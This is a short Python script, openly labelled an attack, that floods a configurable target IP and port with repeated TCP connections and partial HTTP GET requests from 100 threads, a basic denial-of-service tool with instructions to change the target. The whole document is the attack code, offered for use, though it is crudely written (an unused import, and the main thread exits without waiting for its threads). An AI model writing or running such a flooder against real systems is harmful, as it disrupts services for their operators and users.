import socket
import random
import threading

# Target IP address and port number
target_ip = "192.168.1.10"  # Change this to your target IP address
target_port = 80  # Common HTTP port (80). Change as necessary.

# Function to perform a single attack packet
def attack():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            sock.sendto(b"GET / HTTP/1.1\r\n", (target_ip, target_port))
            sock.close()
        except Exception as e:
            print(f"Connection failed: {e}")

# Number of threads to use for the attack
num_threads = 100

# Launch attack threads
threads = []
for i in range(num_threads):
    thread = threading.Thread(target=attack)
    thread.daemon = True  # Allows threads to exit cleanly
    threads.append(thread)
    thread.start()

print(f"Attack started on {target_ip}:{target_port} with {num_threads} threads.")
